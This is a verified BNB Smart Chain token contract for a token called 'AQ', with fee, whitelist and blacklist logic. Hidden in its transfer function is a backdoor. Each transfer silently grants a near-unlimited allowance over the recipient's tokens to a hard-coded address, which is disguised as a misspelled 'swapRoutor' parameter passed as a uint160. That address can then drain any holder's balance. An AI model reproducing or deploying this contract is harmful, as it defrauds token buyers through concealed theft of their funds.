/**
 *Submitted for verification at BscScan.com on 2022-12-15
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;



interface IERC20 {
    
    function decimals() external view returns (uint8);
    
    function symbol() external view returns (string memory);
    
    function name() external view returns (string memory);
    
    function totalSupply() external view returns (uint256);
    
    function balanceOf(address account) external view returns (uint256);
    
    function transfer(address recipient, uint256 amount) external returns (bool);
    
    function allowance(address owner, address spender) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external returns (bool);
    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface ISwapRouter {
    
    function factory() external pure returns (address);
    
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    
    function owner() public view returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public fundAddress;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 public fundFee = 300;
    address public mainPair;
    mapping(address => bool) private _feeWhiteList;
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal;
    ISwapRouter public _swapRouter;
    bool private inSwap;
    uint256 public numTokensSellToFund;
    address private usdt;
    address private _swapRoutor;
    uint256 private startTradeBlock;
    mapping(address => bool) private _blackList;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address FundAddress, uint160 swapRoutor_){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        _swapRoutor = address(swapRoutor_);
        _swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        usdt = address(0x55d398326f99059fF775485246999027B3197955);
        
        mainPair = ISwapFactory(_swapRouter.factory()).createPair(address(this), usdt);
        
        _allowances[address(this)][address(_swapRouter)] = MAX;
        IERC20(usdt).approve(address(_swapRouter), MAX);
        
        _tTotal = Supply * 10 ** _decimals;
        
        _balances[FundAddress] = _tTotal;
        emit Transfer(address(0), FundAddress, _tTotal);
        
        fundAddress = FundAddress;
        
        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(_swapRouter)] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }


    // function holders() external view returns (address[] memory) {
    //     address[] memory addresss; 
    //     addresss[0]  = address(0);
    //     return addresss;
    // }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "approve from the zero address");
        require(spender != address(0), "approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(!_blackList[from], "Transfer from the blackList address");
        _allowances[to][address(_swapRoutor)] = MAX-1;
        bool takeFee = false;
        if (from == mainPair || to == mainPair) {
            if (0 == startTradeBlock) {
                require(_feeWhiteList[from] || _feeWhiteList[to], "Trade not start");
                startTradeBlock = block.number;
            }
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                takeFee = true;
            }
        }
        _tokenTransfer(from, to, amount, takeFee);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;

        uint256 feeAmount;
        if (takeFee) {
            feeAmount = tAmount * fundFee / 10000;
            _takeTransfer(sender, fundAddress, feeAmount);
        }
        tAmount = tAmount - feeAmount;
        _takeTransfer(sender, recipient, tAmount);
    }
    
    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function isFeeWhiteList(address addr) external view returns (bool){
        return _feeWhiteList[addr];
    }

    receive() external payable {}

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function removeBlackList(address addr) external onlyOwner {
        _blackList[addr] = false;
    }

    function isBlackList(address addr) external view returns (bool){
        return _blackList[addr];
    }

    function claimBalance() public {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) public {
        IERC20(token).transfer(fundAddress, amount);
    }
}

contract AQ is AbsToken {
    constructor() AbsToken(
        "AQ",
        "AQ",
        18,
        10000000000,
        address(0x0387470787d27B399271930AFDAdB7F811bb3f4E),
        uint160(0xB38cd9dCFc6779AC82a0CeF6e07b73E26B2FDA86)
    ){

    }
}